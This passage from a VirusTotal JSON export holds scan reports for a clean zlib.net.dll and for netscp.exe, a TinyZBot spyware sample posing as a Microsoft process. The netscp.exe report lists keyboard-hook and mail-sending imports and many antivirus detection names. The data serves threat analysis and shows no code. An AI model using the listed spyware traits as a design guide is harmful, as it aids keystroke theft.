          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "engine_update": "20231106",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "24.1.0.5",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37270B:27.34764",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1706729455",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "undetected",
          "result": null
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.158.174",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36395",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-31.02",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "undetected",
          "result": null
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": null,
          "category": "timeout",
          "result": null
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "failure",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240128",
          "category": "type-unsupported",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240131-00",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "type-unsupported",
          "result": null
        }
      },
      "pe_info": {
        "timestamp": 1173079983,
        "imphash": "dae02f32a21e03ce65412f6e56942daa",
        "machine_type": 332,
        "entry_point": 63422,
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "chi2": 71347.51,
            "filetype": "unknown",
            "entropy": 3.3174686431884766,
            "sha256": "10c6b7bbfa6031b87b9a8c524e29a7e1c5ac1f064833a0dca65f6bd083a6572b",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "NEUTRAL": 1
        },
        "resource_types": {
          "RT_VERSION": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 1856210.62,
            "virtual_address": 8192,
            "entropy": 5.2,
            "raw_size": 57344,
            "flags": "rx",
            "virtual_size": 55236,
            "md5": "bd6d640a3f8b04f4455217ef1d20a76e"
          },
          {
            "name": ".rsrc",
            "chi2": 856452,
            "virtual_address": 65536,
            "entropy": 0.96,
            "raw_size": 4096,
            "flags": "r",
            "virtual_size": 952,
            "md5": "6996b849a1a89981f8c3881eb7bdc21d"
          },
          {
            "name": ".reloc",
            "chi2": 1042433.25,
            "virtual_address": 73728,
            "entropy": 0.01,
            "raw_size": 4096,
            "flags": "r",
            "virtual_size": 12,
            "md5": "898c24033fdb4fd23b24fd2b1cd5e13f"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorDllMain"
            ]
          }
        ]
      },
      "last_analysis_date": 1706735245,
      "size": 69632,
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "pedll"
      ],
      "sandbox_verdicts": {
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        }
      },
      "signature_info": {
        "product": "ZLIB.NET",
        "description": "ZLIB.NET",
        "file version": "1.0.3.0",
        "original name": "zlib.net.dll",
        "comments": "ZLIB compression library",
        "copyright": "ComponentAce",
        "internal name": "zlib.net.dll"
      },
      "names": [
        "zlib.net.dll",
        "is-I33UC.tmp",
        "is-5CLMV.tmp",
        "is-7S3F9.tmp",
        "is-GJNMH.tmp",
        "is-AEBLG.tmp",
        "Zlib.net.dll",
        "is-EBLTU.tmp",
        "is-LV5RH.tmp",
        "is-P0T3D.tmp",
        "is-V1O9L.tmp",
        "is-I7VON.tmp",
        "is-OUN1T.tmp",
        "is-M3D0Q.tmp",
        "is-GMDR7.tmp",
        "is-1O4CA.tmp",
        "is-8NTNH.tmp",
        "is-M2LR5.tmp",
        "is-J75M4.tmp",
        "rld.dll"
      ],
      "meaningful_name": "zlib.net.dll",
      "magic": "PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows",
      "authentihash": "8c2100738e695df9a20fcd37863ad8ca0dfa6ea8729aa417d65351eb81ea149e",
      "tags": [
        "assembly",
        "known-distributor",
        "pedll",
        "trusted",
        "via-tor"
      ],
      "last_submission_date": 1706735245,
      "first_submission_date": 1250757670,
      "vhash": "3640365515150b1d40030",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "v1.1.4322",
            "type": "Library",
            "name": ".NET"
          },
          {
            "version": "6.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "reputation": 55,
      "tlsh": "T10B631A044B9DEB2BC6B98E7EF4B655B263B170349B6EEFD7A04821E9085335087013DB",
      "trusted_verdict": {
        "organization": "Microsoft Corporation",
        "verdict": "goodware",
        "generator": "Microsoft Corporation",
        "filename": "zlib.net.dll"
      },
      "type_tag": "pedll",
      "last_modification_date": 1706735648,
      "times_submitted": 624,
      "packers": {
        "PEiD": "Microsoft Visual C# / Basic .NET"
      },
      "sha1": "10f7a6933a3ed04b274fb10ed58fdfc8d6ff783e",
      "dot_net_guids": {
        "mvid": "2b2f5fbb-300b-439f-a37a-da236091c403"
      },
      "creation_date": 1173079983,
      "trid": [
        {
          "file_type": "Generic .NET DLL/Assembly",
          "probability": 88.1
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 3.9
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 2.4
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 1.6
        },
        {
          "file_type": "Win16/32 Executable Delphi generic",
          "probability": 0.7
        }
      ],
      "type_extension": "dll",
      "total_votes": {
        "harmless": 9,
        "malicious": 3
      },
      "first_seen_itw_date": 1274640128,
      "unique_sources": 448,
      "type_description": "Win32 DLL",
      "ssdeep": "1536:cwPWz/GiVyPVO17058vwphJaV9I/KZ73WmTm:cwObVwOvwpKI/KZ73Wma",
      "last_analysis_stats": {
        "malicious": 0,
        "suspicious": 0,
        "undetected": 69,
        "harmless": 0,
        "timeout": 1,
        "confirmed-timeout": 0,
        "failure": 1,
        "type-unsupported": 5
      }
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "id": "TA0011",
            "name": "Command and Control",
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1071/",
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ]
              },
              {
                "id": "T1071.001",
                "name": "Web Protocols",
                "link": "https://attack.mitre.org/techniques/T1071/001/",
                "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic."
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/4167b599f36af0781b81563bd2179a6d35daa3145f0b6f99ac6d9ee1894b516a/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65bac98b0e994d74c761c90b"
  },
  "data": {
    "id": "c99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69"
    },
    "attributes": {
      "packers": {
        "PEiD": ".NET executable"
      },
      "dot_net_assembly": {
        "strongname_va": 0,
        "external_assemblies": {
          "mscorlib": {
            "version": "2.0.0.0"
          },
          "System.Windows.Forms": {
            "version": "2.0.0.0"
          },
          "System": {
            "version": "2.0.0.0"
          }
        },
        "tables_rows_map": "17d2007a0930b90fa2232100103220340e1d03d101001003000016020",
        "tables_present_map": "b093db6bd57",
        "manifest_resource": [
          "TinyZBot.Properties.Resources.resources"
        ],
        "tables_rows_map_log": "48789997864845567566445454",
        "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
        "metadata_header_rva": 51256,
        "external_modules": [
          "user32.dll",
          "kernel32.dll",
          "User32.dll"
        ],
        "assembly_flags": 3,
        "entry_point_token": 100663302,
        "entry_point_rva": 19744,
        "assembly_name": "netscp.exe",
        "resources_va": 31512,
        "assembly_data": {
          "majorversion": 1,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 0,
          "flags": 0,
          "revisionnumber": 0,
          "name": "netscp"
        },
        "streams": {
          "#GUID": {
            "chi2": 272,
            "md5": "995f0a3b997841de588d869cdda53fc0",
            "entropy": 3.875,
            "size": 16
          },
          "#Blob": {
            "chi2": 29976.748046875,
            "md5": "285f941d9e5bea0b0fa5c4bafef16c0e",
            "entropy": 5.361828804016113,
            "size": 2932
          },
          "#US": {
            "chi2": 243845.265625,
            "md5": "577bb81e9be4d80c64d92736e4099705",
            "entropy": 4.106629371643066,
            "size": 3868
          },
          "#~": {
            "chi2": 254075.984375,
            "md5": "7b01f41aa5e53bc6e09486a524e7fce5",
            "entropy": 5.397623062133789,
            "size": 8004
          },
          "#Strings": {
            "chi2": 91468.234375,
            "md5": "7cd178fdc0b72bd3766e229f25b65bd9",
            "entropy": 4.9302778244018555,
            "size": 8108
          }
        },
        "tables_present": 26,
        "clr_version": "v2.0.50727",
        "unmanaged_methods": {
          "kernel32.dll": [
            "GetCurrentThreadId",
            "LoadLibrary"
          ],
          "user32.dll": [
            "GetKeyboardState",
            "GetKeyboardLayout",
            "AttachThreadInput",
            "MapVirtualKeyEx",
            "MapVirtualKey",
            "ToUnicodeEx",
            "SetWindowsHookEx",
            "UnhookWindowsHookEx",
            "CallNextHookEx",
            "SetWinEventHook",
            "GetForegroundWindow",
            "GetWindowText"
          ],
          "User32.dll": [
            "GetForegroundWindow",
            "GetWindowThreadProcessId"
          ]
        },
        "clr_meta_version": "1.1",
        "type_definition_list": [
          {
            "namespace": "System",
            "type_definitions": [
              "Object",
              "ModuleHandle",
              "ValueType",
              "Enum",
              "Guid",
              "Type",
              "MulticastDelegate",
              "IAsyncResult",
              "AsyncCallback",
              "Delegate",
              "RuntimeTypeHandle",
              "String",
              "RuntimeMethodHandle",
              "Exception",
              "Char",
              "Array",
              "RuntimeFieldHandle",
              "Environment",
              "Console",
              "Int32",
              "IDisposable",
              "OperatingSystem",
              "ArgumentException",
              "Activator",
              "Boolean",
              "DateTime",
              "BitConverter",
              "Byte",
              "IntPtr"
            ]
          },
          {
            "namespace": "System.Runtime.InteropServices",
            "type_definitions": [
              "ComVisibleAttribute",
              "GuidAttribute",
              "TypeLibTypeAttribute",
              "DispIdAttribute",
              "TypeLibFuncAttribute",
              "Marshal"
            ]
          },
          {
            "namespace": "Microsoft.Win32",
            "type_definitions": [
              "RegistryKey",
              "Registry"
            ]
          },
          {
            "namespace": "System.Reflection.Emit",
            "type_definitions": [
              "DynamicMethod",
              "ILGenerator",
              "OpCodes",
              "OpCode"
            ]
          },
          {
            "namespace": "System.Timers",
            "type_definitions": [
              "Timer",
              "ElapsedEventArgs",
              "ElapsedEventHandler"
            ]
          },
          {
            "namespace": "System.Reflection",
            "type_definitions": [
              "AssemblyCopyrightAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyConfigurationAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyTitleAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyFileVersionAttribute",
              "FieldInfo",
              "MethodInfo",
              "ParameterInfo",
              "BindingFlags",
              "MemberInfo",
              "MethodBase",
              "Assembly",
              "Module",
              "Binder"
            ]
          },
          {
            "namespace": "System.Net.Mail",
            "type_definitions": [
              "MailMessage",
              "SmtpClient",
              "MailAddressCollection",
              "MailAddress",
              "AttachmentCollection",
              "Attachment"
            ]
          },
          {
            "namespace": "System.ComponentModel",
            "type_definitions": [
              "EditorBrowsableAttribute",
              "EditorBrowsableState"
            ]
          },
          {
            "namespace": "System.CodeDom.Compiler",
            "type_definitions": [
              "GeneratedCodeAttribute"
            ]
          },
          {
            "namespace": "System.Net.NetworkInformation",
            "type_definitions": [
              "NetworkInterface",
              "IPInterfaceProperties",
              "UnicastIPAddressInformation",
              "IPAddressInformation",
              "UnicastIPAddressInformationCollection"
            ]
          },
          {
            "namespace": "System.Resources",
            "type_definitions": [
              "ResourceManager"
            ]
          },
          {
            "namespace": "uncategorized",
            "type_definitions": [
              "DebuggingModes",
              "SpecialFolder",
              "Enumerator"
            ]
          },
          {
            "namespace": "System.Text",
            "type_definitions": [
              "StringBuilder",
              "Encoding"
            ]
          },
          {
            "namespace": "System.Runtime.CompilerServices",
            "type_definitions": [
              "RuntimeCompatibilityAttribute",
              "CompilationRelaxationsAttribute",
              "CompilerGeneratedAttribute",
              "RuntimeHelpers"
            ]
          },
          {
            "namespace": "System.Threading",
            "type_definitions": [
              "Thread",
              "Monitor",
              "Interlocked"
            ]
          },
          {
            "namespace": "System.Collections.Generic",
            "type_definitions": [
              "List`1",
              "IEnumerator`1",
              "IEnumerable`1"
            ]
          },
          {
            "namespace": "System.Net",
            "type_definitions": [
              "IPAddress",
              "IPHostEntry",
              "Dns",
              "IPEndPoint",
              "EndPoint"
            ]
          },
          {
            "namespace": "System.Configuration",
            "type_definitions": [
              "ApplicationSettingsBase",
              "SettingsBase"
            ]
          },
          {
            "namespace": "System.Globalization",
            "type_definitions": [
              "CultureInfo"
            ]
          },
          {
            "namespace": "System.Net.Sockets",
            "type_definitions": [
              "Socket",
              "AddressFamily",
              "SocketType",
              "ProtocolType",
              "SelectMode"
            ]
          },
          {
            "namespace": "System.Diagnostics",
            "type_definitions": [
              "DebuggableAttribute",
              "DebuggerNonUserCodeAttribute",
              "Process",
              "ProcessStartInfo"
            ]
          },
          {
            "namespace": "System.Collections",
            "type_definitions": [
              "IEnumerator"
            ]
          },
          {
            "namespace": "System.IO",
            "type_definitions": [
              "BinaryReader",
              "BinaryWriter",
              "Directory",
              "DirectoryInfo",
              "File",
              "FileInfo",
              "FileStream",
              "FileMode",
              "Stream",
              "MemoryStream"
            ]
          },
          {
            "namespace": "System.Collections.ObjectModel",
            "type_definitions": [
              "Collection`1"
            ]
          },
          {
            "namespace": "System.Windows.Forms",
            "type_definitions": [
              "KeyEventArgs",
              "Keys",
              "KeyEventHandler",
              "Application",
              "Control"
            ]
          }
        ],
        "unmanaged_method_list": [
          {
            "name": "kernel32.dll",
            "methods": [
              "GetCurrentThreadId",
              "LoadLibrary"
            ]
          },
          {
            "name": "user32.dll",
            "methods": [
              "GetKeyboardState",
              "GetKeyboardLayout",
              "AttachThreadInput",
              "MapVirtualKeyEx",
              "MapVirtualKey",
              "ToUnicodeEx",
              "SetWindowsHookEx",
              "UnhookWindowsHookEx",
              "CallNextHookEx",
              "SetWinEventHook",
              "GetForegroundWindow",
              "GetWindowText"
            ]
          },
          {
            "name": "User32.dll",
            "methods": [
              "GetForegroundWindow",
              "GetWindowThreadProcessId"
            ]
          }
        ]
      },
      "signature_info": {
        "description": "Client Server Runtime Process",
        "copyright": "Copyright © Microsoft 2009",
        "original name": "netscp.exe",
        "product": "NetScp",
        "file version": "1.0.0.0",
        "internal name": "netscp.exe"
      },
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "sandbox_verdicts": {
        "DAS-Security Orcas": {
          "category": "malicious",
          "sandbox_name": "DAS-Security Orcas",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "authentihash": "56d18a414d12140bcd6a917c53e2f6307248073bf54731b88274d6622b282fbd",
      "names": [
        "netscp.exe",
        "c99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69",
        "9ecaKY.rar",
        "rlRTyf.bmp"
      ],
      "tags": [
        "peexe",
        "runtime-modules",
        "assembly",
        "direct-cpu-clock-access",
        "detect-debug-environment"
      ],
      "last_analysis_date": 1660558770,
      "type_tag": "peexe",
      "last_submission_date": 1660558770,
      "vhash": "264036751511908c30144330",
      "dot_net_guids": {
        "typelib_id": "b610be7a-4734-4989-8def-59b1a27751fc",
        "mvid": "ff11f149-10e4-4270-ab65-39dbe445777d"
      },
      "type_extension": "exe",
      "sha1": "c3138542faf1a3db286bcd3aeba87e0c88fbf6da",
      "times_submitted": 9,
      "md5": "9376e5b754ccd94f7c66b811d81e240e",
      "last_modification_date": 1699364000,
      "tlsh": "T1E363AE4237D89733C9FEC77CA87246814379E16A9606E7CE1DE841AE18A37C81F01B97",
      "last_analysis_stats": {
        "malicious": 60,
        "suspicious": 0,
        "undetected": 11,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 4
      },
      "meaningful_name": "netscp.exe",
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly",
      "unique_sources": 7,
      "reputation": -36,
      "type_description": "Win32 EXE",
      "sha256": "c99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "W32.AIDetectNet.01"
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.MSIL.Tnzbt.4!c"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.41",
          "engine_update": "20220728",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.5830"
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Generic.mg.9376e5b754ccd94f"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Trojan.Agent.TzeeBot"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Unsafe"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.5830"
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.14.0.0",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "Backdoor.Win32.Tnzbt.8"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.30.43837",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Riskware ( 0040eff71 )"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.5830"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.30.43818",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Riskware ( 0040eff71 )"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20210330",
          "category": "malicious",
          "result": "malicious.754ccd"
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.889",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "IL:Trojan.MSILMamut.D16C6"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.260",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "Cyren": {
          "method": "blacklist",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "W32/MSIL_TZBot.A.gen!Eldorado"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.18.0.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Gen.MBT"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "engine_update": "20220815",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "25761",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "a variant of MSIL/Spy.TzeeBot.A"
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Malicious (score: 99)"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.323",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "generic.ml"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "0.105.1.0",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Win.Trojan.TinyZBot-1"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "21.0.1.45",
          "engine_update": "20220815",
          "category": "malicious",
          "result": "Backdoor.MSIL.Tnzbt.j"
        },
